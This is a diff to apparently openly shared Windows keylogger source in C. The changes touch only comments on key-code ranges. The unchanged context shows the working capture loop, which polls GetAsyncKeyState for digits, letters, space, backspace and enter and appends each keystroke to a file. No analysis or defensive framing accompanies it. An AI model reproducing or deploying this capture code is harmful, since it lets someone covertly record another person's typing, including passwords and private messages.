@@ -27,7 +27,7 @@ int main()
     while(1){
 
         Sleep(140);
-        //Numbers
+        //Numbers ranging from 48 - 57
         if(GetAsyncKeyState(48) || G(96))fputs("0",fp);
         else if(GetAsyncKeyState(49) || G(97))fputs("1",fp);
         else if(GetAsyncKeyState(50) || G(98))fputs("2",fp);
@@ -38,7 +38,7 @@ int main()
         else if(GetAsyncKeyState(55) || G(103))fputs("7",fp);
         else if(GetAsyncKeyState(56) || G(104))fputs("8",fp);
         else if(GetAsyncKeyState(57) || G(105))fputs("9",fp);
-        //Alphabets
+        //Alphabets Uppercase from 65-90
         else if(GetAsyncKeyState(65))fputs("a",fp);
         else if(GetAsyncKeyState(66))fputs("b",fp);
         else if(GetAsyncKeyState(67))fputs("c",fp);
@@ -64,7 +64,7 @@ int main()
         else if(GetAsyncKeyState(88))fputs("x",fp);
         else if(GetAsyncKeyState(89))fputs("y",fp);
         else if(GetAsyncKeyState(90))fputs("z",fp);
-        //special characters
+        //special characters 
         else if(GetAsyncKeyState(32))fputs(" ",fp); //space
         else if(GetAsyncKeyState(8))fputs("[BACKSPACE]",fp); //backspace
         else if(GetAsyncKeyState(13))fputs("[ENTER]",fp); //enter
